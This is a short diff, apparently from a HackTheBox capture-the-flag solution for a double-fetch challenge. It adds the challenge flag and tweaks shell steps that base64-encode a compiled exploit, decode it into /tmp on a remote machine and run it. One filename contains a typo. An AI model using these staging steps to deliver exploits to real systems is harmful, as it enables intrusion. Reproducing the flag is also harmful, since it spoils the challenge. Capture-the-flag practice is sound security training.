@@ -19,11 +19,13 @@ if simmgr.found:
 # Compress exploit
 gzip exploit
 # Convert to base64 locally and copy the output from output.txt
-cat exploit.gz | base64 > output.txt
+cat exploit.gz | base64 -w 0 > output.txt
 # On remote convert base64 to gz file
 cd /tmp && echo "base64" | base64 -d > exploit.gz
 # Extract exploit
 gzip -d expoit.gz
 # Run the exploit
 chmod +x exploit && ./exploit
+
+HTB{C0ngr4ts_y0u_3xpl0it3d_A_D0uBlE-FeTcH}
 '''
